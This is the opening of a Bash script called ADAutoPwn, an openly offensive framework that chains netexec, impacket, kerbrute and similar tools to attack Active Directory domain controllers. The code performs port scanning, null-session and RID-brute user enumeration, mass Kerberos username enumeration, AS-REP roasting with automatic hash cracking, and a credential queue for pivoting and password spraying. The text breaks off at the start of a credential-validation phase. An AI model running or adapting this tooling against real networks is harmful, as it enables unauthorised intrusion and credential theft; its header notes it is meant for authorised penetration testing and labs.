#!/usr/bin/env bash
#
#  ADAutoPwn  —  Active Directory Automated Pwnage Framework
#  Author : c4sh3r
#  License: MIT  (authorized use only — pentesting / CTF / lab environments)
#
#  A Bash orchestrator that chains nxc/netexec, impacket, certipy, kerbrute,
#  bloodhound-python and friends to automate Active Directory assessment:
#  from the initial port scan all the way to DCSync — covering Kerberos,
#  ADCS abuse and offline cracking, printing every user, hash and step live.
#
#  Design principles:
#    * Kerberos-first authentication (works even when NTLM is disabled,
#      better OPSEC). Falls back to NTLM only when explicitly requested.
#    * Works with zero credentials (null/guest/anonymous enumeration) and
#      progressively unlocks more phases as credentials become available.
#    * Every artifact (users, hashes, tickets, loot) is saved to disk AND
#      printed to the operator in real time.
#
set -o pipefail

# ===========================================================================
#  METADATA
# ===========================================================================
readonly VERSION="1.0.0"
readonly AUTHOR="c4sh3r"
KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"

# ===========================================================================
#  TERMINAL UI  (colors + glyphs + section helpers)
# ===========================================================================
if [[ -t 1 ]] && [[ "${NO_COLOR:-0}" != "1" ]]; then
    C_RESET=$'\e[0m';  C_BOLD=$'\e[1m';   C_DIM=$'\e[2m'
    C_RED=$'\e[38;5;196m';    C_GREEN=$'\e[38;5;46m';   C_YELLOW=$'\e[38;5;226m'
    C_BLUE=$'\e[38;5;39m';    C_MAGENTA=$'\e[38;5;201m'; C_CYAN=$'\e[38;5;51m'
    C_ORANGE=$'\e[38;5;208m'; C_GREY=$'\e[38;5;245m';   C_PURPLE=$'\e[38;5;141m'
else
    C_RESET=''; C_BOLD=''; C_DIM=''; C_RED=''; C_GREEN=''; C_YELLOW=''
    C_BLUE=''; C_MAGENTA=''; C_CYAN=''; C_ORANGE=''; C_GREY=''; C_PURPLE=''
fi

G_INFO="${C_BLUE}${C_BOLD}[*]${C_RESET}"
G_OK="${C_GREEN}${C_BOLD}[+]${C_RESET}"
G_WARN="${C_YELLOW}${C_BOLD}[!]${C_RESET}"
G_ERR="${C_RED}${C_BOLD}[-]${C_RESET}"
G_RUN="${C_PURPLE}${C_BOLD}[>]${C_RESET}"
G_LOOT="${C_MAGENTA}${C_BOLD}[\$]${C_RESET}"
G_QST="${C_CYAN}${C_BOLD}[?]${C_RESET}"

LOGFILE=""   # set in main()

# strip ANSI for the plain-text logfile
_strip() { sed 's/\x1b\[[0-9;]*m//g'; }
_log()   { [[ -n "$LOGFILE" ]] && printf '%s\n' "$(echo -e "$1" | _strip)" >>"$LOGFILE"; }

info()  { echo -e "$G_INFO $1";  _log "[*] $1"; }
ok()    { echo -e "$G_OK ${C_GREEN}$1${C_RESET}"; _log "[+] $1"; }
warn()  { echo -e "$G_WARN ${C_YELLOW}$1${C_RESET}"; _log "[!] $1"; }
err()   { echo -e "$G_ERR ${C_RED}$1${C_RESET}"; _log "[-] $1"; }
run()   { echo -e "$G_RUN ${C_DIM}$1${C_RESET}"; _log "[>] $1"; }
loot()  { echo -e "$G_LOOT ${C_MAGENTA}${C_BOLD}$1${C_RESET}"; _log "[\$] $1"; }
qst()   { echo -ne "$G_QST ${C_CYAN}$1${C_RESET}"; }

section() {
    echo
    echo -e "${C_CYAN}${C_BOLD}╔══════════════════════════════════════════════════════════════════════════╗${C_RESET}"
    printf  "${C_CYAN}${C_BOLD}║${C_RESET} ${C_BOLD}%-72s${C_RESET} ${C_CYAN}${C_BOLD}║${C_RESET}\n" "$1"
    echo -e "${C_CYAN}${C_BOLD}╚══════════════════════════════════════════════════════════════════════════╝${C_RESET}"
    _log ""; _log "==== $1 ===="
}

subsection() {
    echo
    echo -e "  ${C_PURPLE}${C_BOLD}──┤ $1 ├──${C_RESET}"
    _log "  --- $1 ---"
}

hr() { echo -e "${C_GREY}    ----------------------------------------------------------------${C_RESET}"; }

banner() {
    # Modern gradient palette (true-color). Falls back to empty strings w/ --no-color.
    local g1 g2 g3 g4 g5 g6 b1 b2 acc box
    if [[ -n "$C_RESET" ]]; then
        g1=$'\e[38;2;0;255;200m';   g2=$'\e[38;2;0;225;235m'   # teal → cyan
        g3=$'\e[38;2;60;180;255m';  g4=$'\e[38;2;130;120;255m' # blue → indigo
        g5=$'\e[38;2;190;90;255m';  g6=$'\e[38;2;255;70;200m'  # violet → magenta
        b1=$'\e[38;2;255;60;120m';  b2=$'\e[38;2;255;180;60m'  # pink / amber accents
        acc=$'\e[38;2;0;255;160m';  box=$'\e[38;2;90;100;120m'
    fi
cat <<EOF

${box}    ┌────────────────────────────────────────────────────────────────┐${C_RESET}
${g1}${C_BOLD}     █████╗ ██████╗  ${g4}█████╗ ██╗   ██╗████████╗ ██████╗${C_RESET}
${g1}${C_BOLD}    ██╔══██╗██╔══██╗${g4}██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗${C_RESET}
${g2}${C_BOLD}    ███████║██║  ██║${g5}███████║██║   ██║   ██║   ██║   ██║${C_RESET}
${g2}${C_BOLD}    ██╔══██║██║  ██║${g5}██╔══██║██║   ██║   ██║   ██║   ██║${C_RESET}
${g3}${C_BOLD}    ██║  ██║██████╔╝${g6}██║  ██║╚██████╔╝   ██║   ╚██████╔╝${C_RESET}
${g3}${C_BOLD}    ╚═╝  ╚═╝╚═════╝ ${g6}╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝${C_RESET}
${g4}${C_BOLD}              ██████╗ ██╗    ██╗███╗   ██╗${C_RESET}   ${acc}Active Directory${C_RESET}
${g5}${C_BOLD}              ██╔══██╗██║    ██║████╗  ██║${C_RESET}   ${acc}Automated Pwnage${C_RESET}
${g5}${C_BOLD}              ██████╔╝██║ █╗ ██║██╔██╗ ██║${C_RESET}   ${acc}Framework${C_RESET}
${g6}${C_BOLD}              ██╔═══╝ ██║███╗██║██║╚██╗██║${C_RESET}
${g6}${C_BOLD}              ██║     ╚███╔███╔╝██║ ╚████║${C_RESET}   ${b2}v${VERSION}${C_RESET}
${g6}${C_BOLD}              ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝${C_RESET}
${box}    └────────────────────────────────────────────────────────────────┘${C_RESET}
       ${C_BOLD}⚡ From zero to Domain Admin — fully automated.${C_RESET}
       ${box}─────────────────────────────────────────────────────────${C_RESET}
       ${box}» crafted & weaponized by${C_RESET}  ${b1}${C_BOLD}▌${C_RESET} ${acc}${C_BOLD}c4sh3r${C_RESET} ${b1}${C_BOLD}▐${C_RESET}   ${box}«${C_RESET}
       ${box}» authorized engagements only · don't be the bad guy${C_RESET}
       ${box}─────────────────────────────────────────────────────────${C_RESET}
EOF
}

# ===========================================================================
#  GLOBAL STATE
# ===========================================================================
DC_IP=""
DOMAIN=""
DC_HOST=""          # short hostname of the DC
DC_FQDN=""          # hostname.domain
USER=""
PASS=""
HASH=""
KERB_TICKET=""      # path to the .ccache we generate
OUTDIR=""
WORDLIST="/usr/share/wordlists/rockyou.txt"
USERLIST="/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
DO_CRACK=1          # crack captured hashes by default (--no-crack to disable)
DO_BLOODHOUND=1
AUTO_YES=0
SUDO_OK=0
CREDS_FILE=""       # external "user:secret" lines to seed/continue the engine
USERS_FILE=""       # external user list to merge (for spray / AS-REP)
SPRAY_GEN=0         # 1 = also spray the domain-focused wordlist ONLINE (lockout risk)
KERBEROS=1          # 1 = prefer Kerberos for authenticated ops (best default)
DCT=""              # authenticated-call target: FQDN under Kerberos, else IP
HAVE_AUTH=0         # 1 once the CURRENT credential is validated
SUDO_KEEPALIVE_PID=""
# Service capabilities, decided from the port scan — drive which techniques run
CAP_SMB=0; CAP_KERBEROS=0; CAP_LDAP=0; CAP_LDAPS=0; CAP_RPC=0; CAP_WINRM=0; CAP_ADWS=0; CAP_DNS=0
STEALTH=0           # 1 = skip noisy techniques + add jitter (OPSEC)
DO_ABUSE=0          # 1 = actually perform ACL/privilege abuse (otherwise report only)
DO_CLEANUP=0        # 1 = revert every change this tool made, then exit
ROLLBACK_FILE=""    # records undo actions for responsible cleanup
PIVOT_PW='ADAutoPwn!2024#Reset'   # password set when abusing ForceChangePassword

declare -a FOUND_USERS=()
declare -a CRED_QUEUE=()          # pending creds to assess: "user|pass|hash"
declare -A SEEN_CREDS=()          # already-assessed users (avoid loops)
declare -A FOUND_SECRETS=()       # every plaintext password we recover (for spraying)
declare -A SPRAYED=()             # password→done, so we don't spray twice
DOMAIN_WL=""                      # path to the generated domain-focused wordlist

# ===========================================================================
#  HELPERS
# ===========================================================================
have() { command -v "$1" >/dev/null 2>&1; }
NXC="$(command -v nxc || command -v netexec || true)"
die() { err "$1"; exit 1; }

SUDO_PASS="${SUDO_PASS:-}"   # optional: enables fully unattended sudo (-S)

# Run a command as root using cached sudo, a supplied password, or a live prompt.
_sudo() {
    if sudo -n true 2>/dev/null; then sudo "$@"
    elif [[ -n "$SUDO_PASS" ]]; then sudo -S -p '' "$@" <<<"$SUDO_PASS"
    else sudo "$@"; fi
}

# DOMAIN/USER principal for impacket-style tools
imp_principal() { echo "${DOMAIN}/${USER}"; }

# Authentication arguments for netexec (handles kerberos / hash / pass / null)
nxc_cred_args() {
    local a=()
    if [[ "$KERBEROS" == "1" && -n "$KERB_TICKET" ]]; then
        # Reuse the TGT we already requested — most reliable, no re-auth
        a+=(-u "$USER" -k --use-kcache)
        [[ -n "$DOMAIN" ]] && a+=(-d "$DOMAIN")
    else
        [[ -n "$USER" ]] && a+=(-u "$USER")
        if   [[ -n "$HASH" ]]; then a+=(-H "$HASH")
        elif [[ -n "$PASS" ]]; then a+=(-p "$PASS")
        else a+=(-u '' -p ''); fi
        [[ -n "$DOMAIN" ]] && a+=(-d "$DOMAIN")
        [[ "$KERBEROS" == "1" && -n "$DC_FQDN" ]] && a+=(-k)
    fi
    printf '%s\n' "${a[@]}"
}

confirm() {
    [[ "$AUTO_YES" == "1" ]] && return 0
    local ans; qst "$1 [y/N] "; read -r ans
    [[ "$ans" =~ ^([Yy]|yes|si)$ ]]
}

# OPSEC jitter between noisy actions when --stealth is set
jitter() { [[ "$STEALTH" == "1" ]] && sleep "$(( (RANDOM % 4) + 2 ))"; }

# ---------------------------------------------------------------------------
#  ROLLBACK / RESPONSIBLE CLEANUP
#  We record an undo command for every change we make to the target so a
#  later `--cleanup` run can revert the environment to its original state.
#  (We deliberately do NOT touch Windows event logs / anti-forensics.)
# ---------------------------------------------------------------------------
rb_record() {  # rb_record "<human description>" "<shell command that undoes it>"
    [[ -z "$ROLLBACK_FILE" ]] && return
    printf '### %s\n%s\n' "$1" "$2" >>"$ROLLBACK_FILE"
    warn "Change tracked for rollback: $1"
}

# ---------------------------------------------------------------------------
#  CREDENTIAL QUEUE  (drives recursive pivoting)
# ---------------------------------------------------------------------------
queue_cred() {  # queue_cred <user> <password|""> <nthash|"">
    local u="$1" p="$2" h="$3"
    [[ -z "$u" ]] && return
    local key="${u,,}"
    [[ -n "${SEEN_CREDS[$key]:-}" ]] && return   # already assessed this identity
    CRED_QUEUE+=("${u}|${p}|${h}")
    loot "New identity queued for pivoting → ${C_BOLD}${u}${C_RESET}$( [[ -n "$p" ]] && echo " (password)" || echo " (NT hash)")"
}

# Record any recovered plaintext password (with its provenance) for spraying + the map
add_secret() {
    local p="$1" src="${2:-unknown source}"; [[ -z "$p" ]] && return
    [[ -n "${FOUND_SECRETS[$p]:-}" ]] && return
    FOUND_SECRETS["$p"]=1
    echo "$p" >>"$OUTDIR/found_passwords.txt"
    printf '%-30s  ⟵  %s\n' "$p" "$src" >>"$OUTDIR/credential_map.txt"
}

# Record a confirmed/working identity and how it was obtained (for the final map)
note_cred_source() { printf '%-28s  ⟵  %s\n' "$1" "$2" >>"$OUTDIR/valid_creds_map.txt"; }

# ===========================================================================
#  DEPENDENCY CHECK
# ===========================================================================
check_deps() {
    section "DEPENDENCY CHECK"
    local req=(nmap smbclient rpcclient ldapsearch ntpdate)
    local opt=(impacket-secretsdump impacket-GetUserSPNs impacket-GetNPUsers impacket-getTGT certipy bloodhound-python enum4linux-ng smbmap john hashcat)
    local missing=0

    if [[ -z "$NXC" ]]; then err "netexec/nxc NOT found (required)"; missing=1; else ok "netexec/nxc -> $NXC"; fi
    for t in "${req[@]}"; do
        if have "$t"; then ok "$t"; else err "$t (REQUIRED) not found"; missing=1; fi
    done
    for t in "${opt[@]}"; do
        if have "$t"; then ok "$t"; else warn "$t (optional) not found — that phase will be skipped"; fi
    done
    if [[ -x "$KERBRUTE_BIN" ]]; then ok "kerbrute -> $KERBRUTE_BIN"; else warn "kerbrute not found at $KERBRUTE_BIN (user enumeration via Kerberos skipped)"; fi
    if [[ -f "$WORDLIST" ]]; then ok "password wordlist -> $WORDLIST"; else warn "wordlist $WORDLIST missing (cracking limited)"; fi

    [[ "$missing" == "1" ]] && die "Missing required dependencies. Run ./install.sh"
}

# ===========================================================================
#  SUDO  (needed for time sync + /etc/hosts)
# ===========================================================================
request_sudo() {
    section "SUDO PRIVILEGES"
    info "Sudo is used to: sync the local clock with the DC and edit /etc/hosts"
    if sudo -n true 2>/dev/null; then ok "sudo already available (passwordless/cached)"; SUDO_OK=1
    elif [[ -n "$SUDO_PASS" ]]; then
        if sudo -S -p '' -v <<<"$SUDO_PASS" 2>/dev/null; then ok "sudo granted (supplied password)"; SUDO_OK=1
        else err "Supplied sudo password rejected"; SUDO_OK=0; fi
    elif [[ -t 0 ]]; then
        qst "sudo password: "
        if sudo -v; then ok "sudo granted"; SUDO_OK=1
        else warn "sudo unavailable — /etc/hosts edits and time sync will be skipped"; SUDO_OK=0; fi
    else
        warn "No TTY and no SUDO_PASS — skipping sudo steps (pass --sudo-pass or SUDO_PASS=…)"
        SUDO_OK=0
    fi
    if [[ "$SUDO_OK" == "1" ]]; then
        ( while true; do sudo -n true 2>/dev/null; sleep 50; done ) &
        SUDO_KEEPALIVE_PID=$!
    fi
}

# ===========================================================================
#  PHASE 0 — DOMAIN CONTROLLER DISCOVERY
# ===========================================================================
phase_discovery() {
    section "PHASE 0 · DOMAIN CONTROLLER DISCOVERY"

    info "Checking connectivity to ${C_BOLD}$DC_IP${C_RESET}"
    if ping -c1 -W2 "$DC_IP" >/dev/null 2>&1; then ok "Host $DC_IP is up"
    else warn "No ICMP reply (firewall may be filtering, continuing)"; fi

    subsection "Quick scan of key AD ports (nmap)"
    local ports="53,88,135,139,389,445,464,593,636,3268,3269,5985,9389"
    run "nmap -Pn -n -p $ports --open -T4 $DC_IP"
    local nmap_out; nmap_out=$(nmap -Pn -n -p "$ports" --open -T4 "$DC_IP" 2>/dev/null)
    echo "$nmap_out" | grep -E '^[0-9]+/tcp' | while read -r line; do ok "Open port: $line"; done
    echo "$nmap_out" >"$OUTDIR/nmap_dc.txt"

    # Map open ports → capability flags (these gate later technique selection)
    echo "$nmap_out" | grep -q '^88/tcp'   && CAP_KERBEROS=1
    echo "$nmap_out" | grep -q '^445/tcp'  && CAP_SMB=1
    echo "$nmap_out" | grep -qE '^(389|3268)/tcp' && CAP_LDAP=1
    echo "$nmap_out" | grep -qE '^(636|3269)/tcp' && CAP_LDAPS=1
    echo "$nmap_out" | grep -q '^135/tcp'  && CAP_RPC=1
    echo "$nmap_out" | grep -q '^5985/tcp' && CAP_WINRM=1
    echo "$nmap_out" | grep -q '^9389/tcp' && CAP_ADWS=1
    echo "$nmap_out" | grep -q '^53/tcp'   && CAP_DNS=1

    subsection "Capability matrix (drives technique selection)"
    _cap() { [[ "$1" == "1" ]] && echo "${C_GREEN}available${C_RESET}" || echo "${C_RED}n/a${C_RESET}"; }
    echo -e "      Kerberos (88)  : $(_cap $CAP_KERBEROS)   ${C_DIM}AS-REP / Kerberoast / Kerb auth${C_RESET}"
    echo -e "      SMB (445)      : $(_cap $CAP_SMB)   ${C_DIM}shares / RID brute / SAMR enum${C_RESET}"
    echo -e "      LDAP (389)     : $(_cap $CAP_LDAP)   ${C_DIM}users/groups/ACL/LAPS/gMSA/ADCS${C_RESET}"
    echo -e "      LDAPS (636)    : $(_cap $CAP_LDAPS)"
    echo -e "      RPC (135)      : $(_cap $CAP_RPC)   ${C_DIM}rpcclient secondary enum${C_RESET}"
    echo -e "      WinRM (5985)   : $(_cap $CAP_WINRM)   ${C_DIM}remote shell if creds allow${C_RESET}"

    # Decide the authentication method from what's actually exposed
    if [[ "$KERBEROS" == "1" && "$CAP_KERBEROS" != "1" ]]; then
        KERBEROS=0
        warn "Kerberos (88) not exposed → falling back to NTLM authentication"
    fi
    [[ "$CAP_LDAP" != "1" ]] && warn "LDAP not exposed → will use SMB/RPC secondary enumeration where possible"
    [[ "$CAP_SMB"  != "1" && "$CAP_LDAP" != "1" ]] && warn "Neither SMB nor LDAP exposed — enumeration will be very limited"

    subsection "Fingerprinting hostname & domain via SMB"
    run "$NXC smb $DC_IP"
    local smb_info; smb_info=$($NXC smb "$DC_IP" 2>&1)
    echo "$smb_info" | tee -a "$LOGFILE"

    local parsed_host parsed_dom
    parsed_host=$(echo "$smb_info" | grep -oP '\(name:\K[^)]+'   | head -1)
    parsed_dom=$( echo "$smb_info" | grep -oP '\(domain:\K[^)]+' | head -1)
    # When NTLM is disabled (e.g. Kerberos-only DCs) nxc echoes the IP back as
    # name/domain — treat that as "not detected" so the LDAP fallback kicks in.
    [[ "$parsed_host" == "$DC_IP" ]] && parsed_host=""
    [[ "$parsed_dom"  == "$DC_IP" ]] && parsed_dom=""

    [[ -n "$parsed_host" ]] && { DC_HOST="$parsed_host"; ok "DC hostname: ${C_BOLD}$DC_HOST${C_RESET}"; }
    if [[ -z "$DOMAIN" && -n "$parsed_dom" ]]; then DOMAIN="$parsed_dom"; ok "Domain detected: ${C_BOLD}$DOMAIN${C_RESET}"; fi

    # Fallback: resolve domain/FQDN via LDAP rootDSE, then LDAPS certificate.
    # Works on Kerberos-only DCs where SMB fingerprinting yields nothing.
    if [[ -z "$DOMAIN" || -z "$DC_HOST" ]]; then
        subsection "Resolving domain/FQDN via LDAP rootDSE (NTLM-independent)"
        local root dnsh nctx
        root=$(ldapsearch -x -H "ldap://$DC_IP" -s base -b "" dnsHostName defaultNamingContext 2>/dev/null)
        dnsh=$(echo "$root" | grep -oiP 'dnsHostName:\s*\K\S+' | head -1)
        nctx=$(echo "$root" | grep -oiP 'defaultNamingContext:\s*\K\S+' | head -1)
        # LDAPS certificate CN as a secondary source
        if [[ -z "$dnsh" ]]; then
            dnsh=$(timeout 8 openssl s_client -connect "$DC_IP:636" 2>/dev/null </dev/null \
                   | openssl x509 -noout -subject 2>/dev/null | grep -oiP 'CN\s*=\s*\K[^,/]+' | head -1)
        fi
        if [[ -n "$dnsh" && "$dnsh" == *.* ]]; then
            DC_FQDN="$dnsh"; DC_HOST="${dnsh%%.*}"; DOMAIN="${dnsh#*.}"
            ok "Resolved via LDAP: host=${C_BOLD}$DC_HOST${C_RESET} domain=${C_BOLD}$DOMAIN${C_RESET}"
        elif [[ -n "$nctx" ]]; then
            # DC=corp,DC=local -> corp.local
            DOMAIN=$(echo "$nctx" | sed -E 's/[Dd][Cc]=//g; s/,/./g')
            ok "Domain from naming context: ${C_BOLD}$DOMAIN${C_RESET}"
        fi
    fi

    if [[ -n "$DC_HOST" && -n "$DOMAIN" && -z "$DC_FQDN" ]]; then DC_FQDN="${DC_HOST}.${DOMAIN}"; fi
    [[ -n "$DC_FQDN" ]] && ok "DC FQDN: ${C_BOLD}$DC_FQDN${C_RESET}"

    # Decide the target used for authenticated calls
    if [[ "$KERBEROS" == "1" && -n "$DC_FQDN" ]]; then
        DCT="$DC_FQDN"; ok "Authentication mode: ${C_BOLD}Kerberos${C_RESET} (target $DCT)"
    else
        DCT="$DC_IP"
        [[ "$KERBEROS" == "1" ]] && warn "Kerberos requested but FQDN unknown → falling back to NTLM (target $DCT)" && KERBEROS=0
    fi
    [[ -z "$DOMAIN" ]] && warn "Domain could not be auto-detected — supply it with -d <domain>"
}

# ===========================================================================
#  PHASE 1 — /etc/hosts + CLOCK SYNC (Kerberos prerequisite)
# ===========================================================================
phase_hosts_time() {
    section "PHASE 1 · /etc/hosts + CLOCK SYNC (Kerberos prerequisite)"

    if [[ "$SUDO_OK" == "1" && -n "$DOMAIN" ]]; then
        subsection "Updating /etc/hosts"
        local entry="$DC_IP $DC_FQDN $DOMAIN $DC_HOST"
        if [[ -n "$DC_FQDN" ]] && getent hosts "$DC_FQDN" 2>/dev/null | grep -q "^$DC_IP[[:space:]]"; then
            ok "$DC_FQDN already resolves to $DC_IP (nothing to do)"
        else
            # Drop any stale line for this IP, then add a fresh, correct one.
            # NB: we use `bash -c "… >> file"` (not a piped `tee`) because _sudo
            # feeds the sudo password on stdin, which would clobber a pipe.
            _sudo sed -i "\#^${DC_IP}[[:space:]]#d" /etc/hosts 2>/dev/null
            if _sudo bash -c "printf '%s\n' '$entry' >> /etc/hosts"; then
                ok "Appended to /etc/hosts: ${C_BOLD}$entry${C_RESET}"
                rb_record "Added /etc/hosts entry for $DOMAIN ($DC_IP)" \
                          "sudo sed -i '\\#^${DC_IP}[[:space:]]#d' /etc/hosts"
                getent hosts "$DC_FQDN" >/dev/null 2>&1 && ok "$DC_FQDN now resolves" \
                    || warn "$DC_FQDN still not resolving (check /etc/hosts manually)"
            else
                err "Failed to write /etc/hosts"
            fi
        fi
    else
        warn "No sudo or no domain: skipping /etc/hosts (add manually: $DC_IP $DC_FQDN $DOMAIN)"
    fi

    subsection "Synchronizing clock with the DC (critical for Kerberos)"
    if [[ "$SUDO_OK" == "1" ]]; then
        run "sudo ntpdate $DC_IP"
        if _sudo ntpdate "$DC_IP" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'adjust|step|offset'; then
            ok "Clock synced with the DC"
        else
            warn "ntpdate failed, retrying with -u…"
            _sudo ntpdate -u "$DC_IP" 2>&1 | tee -a "$LOGFILE" \
                && ok "Synced (-u mode)" \
                || warn "Could not sync; if Kerberos throws KRB_AP_ERR_SKEW, sync manually"
        fi
    else
        warn "No sudo: cannot sync time. On clock skew run: sudo ntpdate $DC_IP"
    fi
}

# ===========================================================================
#  PHASE 2 — UNAUTHENTICATED ENUMERATION  (null / guest / anonymous)
# ===========================================================================
phase_unauth() {
    section "PHASE 2 · UNAUTHENTICATED ENUMERATION (null / guest / anonymous)"

    subsection "SMB: null session & guest"
    run "$NXC smb $DC_IP -u '' -p ''";    $NXC smb "$DC_IP" -u '' -p '' 2>&1 | tee -a "$LOGFILE"
    run "$NXC smb $DC_IP -u guest -p ''"; $NXC smb "$DC_IP" -u 'guest' -p '' 2>&1 | tee -a "$LOGFILE"

    subsection "SMB: anonymously accessible shares"
    run "$NXC smb $DC_IP -u '' -p '' --shares"
    local sh; sh=$($NXC smb "$DC_IP" -u '' -p '' --shares 2>&1); echo "$sh" | tee -a "$LOGFILE"
    if echo "$sh" | grep -qiE 'READ|WRITE'; then
        loot "Shares reachable without credentials! saved to loot"
        echo "$sh" >"$OUTDIR/shares_anon.txt"
    fi
    have smbmap && { run "smbmap -H $DC_IP -u null -p null"; smbmap -H "$DC_IP" -u null -p null 2>&1 | tee -a "$LOGFILE"; }

    subsection "RID brute force (enumerate users without credentials)"
    run "$NXC smb $DC_IP -u '' -p '' --rid-brute 4000"
    local rb; rb=$($NXC smb "$DC_IP" -u '' -p '' --rid-brute 4000 2>&1); echo "$rb" | tee -a "$LOGFILE"
    echo "$rb" | grep -i 'SidTypeUser' | grep -oP '\\\K[^ ]+' | sort -u >"$OUTDIR/users_ridbrute.txt"
    if [[ -s "$OUTDIR/users_ridbrute.txt" ]]; then
        loot "$(wc -l <"$OUTDIR/users_ridbrute.txt") users via RID brute → users_ridbrute.txt"
        while read -r u; do echo -e "      ${C_GREEN}·${C_RESET} $u"; FOUND_USERS+=("$u"); done <"$OUTDIR/users_ridbrute.txt"
    fi

    subsection "rpcclient: enumdomusers (null session)"
    run "rpcclient -U '' -N $DC_IP -c enumdomusers"
    rpcclient -U '' -N "$DC_IP" -c 'enumdomusers' 2>&1 | tee -a "$LOGFILE" \
        | grep -oP 'user:\[\K[^\]]+' | sort -u >"$OUTDIR/users_rpc.txt"
    [[ -s "$OUTDIR/users_rpc.txt" ]] && loot "Users via rpcclient → users_rpc.txt"

    subsection "LDAP: anonymous bind"
    if [[ -n "$DOMAIN" ]]; then
        local base="dc=${DOMAIN//./,dc=}"
        run "ldapsearch -x -H ldap://$DC_IP -b '$base' -s base"
        ldapsearch -x -H "ldap://$DC_IP" -b "$base" -s base 2>&1 | head -40 | tee -a "$LOGFILE"
    fi

    subsection "enum4linux-ng (full sweep)"
    if [[ "$STEALTH" == "1" ]]; then
        info "Stealth mode: skipping enum4linux-ng (noisy)"
    elif have enum4linux-ng; then
        run "enum4linux-ng -A $DC_IP"
        enum4linux-ng -A "$DC_IP" -oJ "$OUTDIR/enum4linux" 2>&1 | tail -60 | tee -a "$LOGFILE"
    fi

    subsection "kerbrute: user validation (userenum)"
    if [[ "$STEALTH" == "1" ]]; then
        info "Stealth mode: skipping kerbrute userenum (noisy)"
    elif [[ -x "$KERBRUTE_BIN" && -n "$DOMAIN" ]]; then
        cat "$OUTDIR"/users_*.txt 2>/dev/null | sort -u >"$OUTDIR/users_all.txt"
        local list="$OUTDIR/users_all.txt"
        if [[ ! -s "$list" ]]; then
            if [[ -n "$USER" ]]; then
                # We already hold credentials → authenticated enum will get the real
                # user list. Skip the slow/noisy mass brute against a huge wordlist.
                info "Credentials supplied → skipping mass userenum (authenticated enum covers it)"
                list=""
            else
                # No creds at all: spray a capped username list to seed identities.
                list="$OUTDIR/_userenum_seed.txt"
                head -n 5000 "$USERLIST" 2>/dev/null >"$list"
                info "No discovered users → seeding from top 5000 of $USERLIST"
            fi
        fi
        if [[ -n "$list" && -s "$list" ]]; then
            run "$KERBRUTE_BIN userenum -d $DOMAIN --dc $DC_IP $list"
            "$KERBRUTE_BIN" userenum -d "$DOMAIN" --dc "$DC_IP" "$list" 2>&1 | tee -a "$LOGFILE" \
                | grep -i 'VALID' | grep -oP '@\K[^@]+(?=@)' >"$OUTDIR/users_valid.txt"
            [[ -s "$OUTDIR/users_valid.txt" ]] && loot "Kerberos-confirmed valid users → users_valid.txt"
        fi
    fi

    cat "$OUTDIR"/users_*.txt 2>/dev/null | sort -u >"$OUTDIR/users_all.txt"
    [[ -s "$OUTDIR/users_all.txt" ]] && loot "Consolidated user list → users_all.txt ($(wc -l <"$OUTDIR/users_all.txt") unique)"
}

# ===========================================================================
#  PHASE 3 — AS-REP ROASTING (no credentials required)
# ===========================================================================
# Dynamic AS-REP roasting — strategy chosen from the live situation:
#   * authenticated  → ask LDAP for DONT_REQ_PREAUTH users (no wordlist needed)
#   * have user list → roast exactly those
#   * nothing at all → capped username-spray to seed identities
phase_asreproast() {
    section "AS-REP ROASTING"
    [[ -z "$DOMAIN" ]] && { warn "No domain, skipping"; return; }
    [[ "$CAP_KERBEROS" != "1" ]] && { warn "Kerberos (88) not exposed → AS-REP roasting not possible"; return; }
    have impacket-GetNPUsers || { warn "impacket-GetNPUsers unavailable, skipping"; return; }
    local outf="$OUTDIR/asrep_hashes.txt"

    if [[ "$HAVE_AUTH" == "1" ]]; then
        subsection "Authenticated roast (LDAP auto-selects preauth-less users)"
        if [[ -n "$KERB_TICKET" ]]; then
            run "impacket-GetNPUsers $(imp_principal) -k -no-pass -dc-host ${DC_FQDN:-$DC_IP} -request -format hashcat"
            KRB5CCNAME="$KERB_TICKET" impacket-GetNPUsers "$(imp_principal)" -k -no-pass -dc-host "${DC_FQDN:-$DC_IP}" -request -format hashcat 2>&1 \
                | tee -a "$LOGFILE" | grep -E '^\$krb5asrep\$' >>"$outf"
        elif [[ -n "$HASH" ]]; then
            run "impacket-GetNPUsers $(imp_principal) -hashes :$HASH -dc-ip $DC_IP -request -format hashcat"
            impacket-GetNPUsers "$(imp_principal)" -hashes ":$HASH" -dc-ip "$DC_IP" -request -format hashcat 2>&1 \
                | tee -a "$LOGFILE" | grep -E '^\$krb5asrep\$' >>"$outf"
        else
            run "impacket-GetNPUsers $(imp_principal):*** -dc-ip $DC_IP -request -format hashcat"
            impacket-GetNPUsers "$(imp_principal):${PASS}" -dc-ip "$DC_IP" -request -format hashcat 2>&1 \
                | tee -a "$LOGFILE" | grep -E '^\$krb5asrep\$' >>"$outf"
        fi
    else
        # Unauthenticated: pick a user source dynamically
        local userfile=""
        if [[ -s "$OUTDIR/users_all.txt" ]]; then
            userfile="$OUTDIR/users_all.txt"
            subsection "Unauth roast against $(wc -l <"$userfile") discovered users"
        elif [[ -z "$USER" && -z "$HASH" ]]; then
            userfile="$OUTDIR/_asrep_seed.txt"; head -n 5000 "$USERLIST" 2>/dev/null >"$userfile"
            subsection "No creds and no users → seeding from top 5000 usernames"
        else
            info "Have credentials but no users yet → deferring AS-REP to the authenticated pass"
            return
        fi
        [[ ! -s "$userfile" ]] && { warn "No usable user source for AS-REP"; return; }
        run "impacket-GetNPUsers $DOMAIN/ -no-pass -usersfile <list> -dc-ip $DC_IP -format hashcat"
        impacket-GetNPUsers "${DOMAIN}/" -no-pass -usersfile "$userfile" -dc-ip "$DC_IP" -format hashcat 2>&1 \
            | tee -a "$LOGFILE" | grep -E '^\$krb5asrep\$' >>"$outf"
    fi

    if [[ -s "$outf" ]]; then
        sort -u -o "$outf" "$outf"
        loot "AS-REP hashes captured!"
        while read -r h; do echo -e "      ${C_MAGENTA}${h:0:80}…${C_RESET}"; done <"$outf"
        ok "Saved to asrep_hashes.txt (crack with: hashcat -m 18200)"
        [[ "$DO_CRACK" == "1" ]] && crack_hashes "$outf" 18200 "AS-REP"
    else
        info "No AS-REP-roastable users found"
    fi
}

# ===========================================================================
#  PHASE 4 — CREDENTIAL VALIDATION + KERBEROS TGT
# ===========================================================================
phase_validate_creds() {
    [[ -z "$USER" ]] && return
